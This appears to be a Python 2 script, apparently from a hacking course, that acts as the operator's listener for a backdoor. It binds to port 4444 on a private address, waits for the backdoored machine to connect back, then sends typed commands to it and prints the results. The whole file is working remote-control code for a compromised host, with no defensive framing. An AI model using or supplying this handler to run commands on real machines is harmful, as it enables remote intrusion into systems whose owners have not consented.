import socket


listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # In case connection drop, retrieve it
listener.bind(("192.168.190.140", 4444))
listener.listen(0)  # the number of connection that can be queued
print("[+] Waiting for incoming connections")
connection, address = listener.accept()  # accept() -> (socket object, address info)
print("[+] Got a connection from " + str(address))

while True:
    command = raw_input(">> ")
    connection.send(command)  # Sending command to backdoor
    result = connection.recv(1024)  # Receiving output from backdoor
    print(result)
